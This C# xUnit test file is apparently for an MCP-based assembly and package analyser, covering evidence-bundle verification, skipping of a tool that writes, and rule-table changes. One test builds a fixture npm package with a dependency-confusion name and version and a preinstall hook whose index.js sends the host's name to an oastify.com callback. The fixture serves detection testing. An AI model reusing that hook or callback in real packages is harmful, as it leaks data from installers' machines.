using ModelContextProtocol.Protocol;
using Xunit.Abstractions;

namespace Corvus.Tests;

/// <summary>read_result format=evidence / verify: the ten latest calls round-trip and verify; a changed input fails, naming each record.</summary>
public sealed class EvidenceBundleTests(ITestOutputHelper output) : IDisposable
{
    private readonly TempDir _dir = new();

    public void Dispose() => _dir.Dispose();

    private static string Text(CallToolResult r) => string.Concat(r.Content.OfType<TextContentBlock>().Select(b => b.Text));

    [Fact]
    public async Task A_bundle_verifies_and_a_changed_input_is_named()
    {
        var input = _dir.File("sample.dll");
        File.Copy(Env.FixturePath, input);
        var bundle = _dir.File("findings.json");
        await using (var server = await InProcessServer.StartAsync())
        {
            await server.Client.CallToolAsync("load_assembly", new Dictionary<string, object?> { ["path"] = input });
            var types = await server.Client.CallToolAsync("list_types", new Dictionary<string, object?> { ["assembly"] = "sample.dll", ["limit"] = 200 });
            var names = types.StructuredContent!.Value.GetProperty("items").EnumerateArray().Select(t => t.GetProperty("name").GetString()!).ToList();
            foreach (var name in names.Take(10))
                await server.Client.CallToolAsync("decompile_member", new Dictionary<string, object?> { ["assembly"] = "sample.dll", ["member"] = name });
            var written = await server.Client.CallToolAsync("read_result", new Dictionary<string, object?> { ["id"] = "last:10", ["format"] = "evidence", ["outputPath"] = bundle });
            output.WriteLine(Text(written));
            var verified = Text(await server.Client.CallToolAsync("read_result", new Dictionary<string, object?> { ["id"] = bundle, ["format"] = "verify" }));
            output.WriteLine(verified);
            Assert.Contains("10 record(s), 10 verified, 0 differ", verified);
        }
        File.AppendAllBytes(input, [0]);
        await using (var server = await InProcessServer.StartAsync())
        {
            await server.Client.CallToolAsync("load_assembly", new Dictionary<string, object?> { ["path"] = input });
            var verified = Text(await server.Client.CallToolAsync("read_result", new Dictionary<string, object?> { ["id"] = bundle, ["format"] = "verify" }));
            output.WriteLine(verified);
            Assert.Contains("0 verified, 10 differ", verified);
            Assert.Matches(@"DIFFERS  c-[0-9]+ decompile_member: input sample\.dll changed", verified);
        }
    }

    [Fact]
    public async Task A_bundle_naming_a_tool_that_writes_is_skipped_and_writes_nothing()
    {
        var input = _dir.File("sample.dll");
        File.Copy(Env.FixturePath, input);
        var target = _dir.File("written.dll");
        var bundle = _dir.File("crafted.json");
        var save = System.Text.Json.JsonSerializer.Serialize(new { assembly = "sample.dll", outputPath = target });
        var types = System.Text.Json.JsonSerializer.Serialize(new { assembly = "sample.dll" });
        File.WriteAllText(bundle, System.Text.Json.JsonSerializer.Serialize(new
        {
            format = "corvus-evidence/1", corvus = "0", created = DateTimeOffset.UtcNow,
            records = new object[]
            {
                new { id = "c-1", tool = "save_assembly", arguments = save, inputs = Array.Empty<object>(), contentSha256 = new string('0', 64), text = "", structured = (string?)null },
                new { id = "c-2", tool = "list_types", arguments = types, inputs = Array.Empty<object>(), contentSha256 = new string('0', 64), text = "", structured = (string?)null },
            },
        }));
        await using var server = await InProcessServer.StartAsync();
        await server.Client.CallToolAsync("load_assembly", new Dictionary<string, object?> { ["path"] = input });
        var verified = Text(await server.Client.CallToolAsync("read_result", new Dictionary<string, object?> { ["id"] = bundle, ["format"] = "verify" }));
        output.WriteLine(verified);
        Assert.Contains("SKIPPED  c-1 save_assembly: skipped: save_assembly is not read-only", verified);
        Assert.Contains("DIFFERS  c-2 list_types: the content differs", verified);
        Assert.Contains("0 verified, 1 differ, 1 skipped", verified);
        Assert.False(File.Exists(target));
    }

    [Fact]
    public async Task Verify_of_an_overview_made_under_another_rule_table_names_the_change_and_the_new_match()
    {
        var package = _dir.File("internal-auth-1.0.0.tgz");
        using (var gz = new System.IO.Compression.GZipStream(File.Create(package), System.IO.Compression.CompressionLevel.Fastest))
        using (var tar = new System.Formats.Tar.TarWriter(gz, System.Formats.Tar.TarEntryFormat.Ustar))
            foreach (var (name, text) in new[]
                     {
                         ("package/package.json", """{"name":"internal-auth-utils","version":"99.0.0","scripts":{"preinstall":"node index.js"}}"""),
                         ("package/index.js", "require('https').get('https://x1.oastify.com/?h='+require('os').hostname());"),
                     })
                tar.WriteEntry(new System.Formats.Tar.UstarTarEntry(System.Formats.Tar.TarEntryType.RegularFile, name) { DataStream = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(text)) });
        var bundle = _dir.File("older-rules.json");
        // A record as an earlier rule table wrote it: another digest, no findings.
        var then = System.Text.Json.JsonSerializer.Serialize(new { ruleTable = "0000000000000000", findings = Array.Empty<object>() });
        File.WriteAllText(bundle, System.Text.Json.JsonSerializer.Serialize(new
        {
            format = "corvus-evidence/1", corvus = "0", created = DateTimeOffset.UtcNow,
            records = new object[]
            {
                new { id = "c-1", tool = "summarize_file", arguments = System.Text.Json.JsonSerializer.Serialize(new { path = package }), inputs = Array.Empty<object>(),
                    contentSha256 = new string('0', 64), text = "", structured = then },
            },
        }));
        await using var server = await InProcessServer.StartAsync();
        var verified = Text(await server.Client.CallToolAsync("read_result", new Dictionary<string, object?> { ["id"] = bundle, ["format"] = "verify" }));
        output.WriteLine(verified);
        Assert.Contains($"rules changed: rule table 0000000000000000 then, {Corvus.Services.Analysis.FindingRules.Digest} now", verified);
        Assert.Contains("noteworthy package/collection-url at package/index.js", verified);
        Assert.Contains("gone: none", verified);
    }
}
